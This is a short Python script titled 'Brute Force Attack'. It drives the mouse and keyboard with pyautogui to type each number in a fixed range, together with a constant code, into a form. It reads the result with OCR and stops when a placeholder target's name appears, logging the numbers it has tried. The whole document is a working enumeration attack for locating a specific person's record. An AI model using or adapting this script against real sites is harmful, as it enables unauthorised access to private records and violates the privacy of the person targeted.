# Brute Force Attack

import numpy as nm
import pytesseract
import cv2
from PIL import ImageGrab
import pyautogui as p
from time import sleep

file = open('progress.txt', 'a+')

def imToString():
	pytesseract.pytesseract.tesseract_cmd ='C:\\Program Files\\Tesseract-OCR\\tesseract.exe'
	
	cap = ImageGrab.grab(bbox=(390, 265, 540, 283))
	tesstr = pytesseract.image_to_string(
			cv2.cvtColor(nm.array(cap), cv2.COLOR_BGR2GRAY),
			lang ='eng')
	return tesstr

s_code = '23506'
t = 1

p.moveTo(x=1247, y=18)
p.click()

for r_no in range(13704055, 13704328):
    
    p.moveTo(x=757, y=338)
    p.click()       

    p.write(str(r_no))
    p.moveTo(x=757, y=363)
    p.click()
    p.write(s_code)
    p.press('enter')
    sleep(t)
    out = imToString()
    modified = out.split()
    if '<TARGET NAME>' in modified[0]:
        break
    p.press('tab', presses = 2)
    p.press('enter')
    sleep(t)
    file.write(str(r_no) + '\n')
